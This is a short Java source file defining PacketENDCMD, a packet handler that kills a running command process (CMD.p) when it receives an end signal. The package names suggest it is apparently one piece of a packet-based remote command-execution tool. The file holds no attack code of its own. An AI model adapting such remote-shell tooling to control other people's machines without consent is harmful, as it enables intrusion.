package com.redpois0n.packets;

import com.redpois0n.CMD;

public class PacketENDCMD extends Packet {

	@Override
	public void read(String line) throws Exception {
		if (CMD.p != null) {
			CMD.p.destroy();
		}
	}

}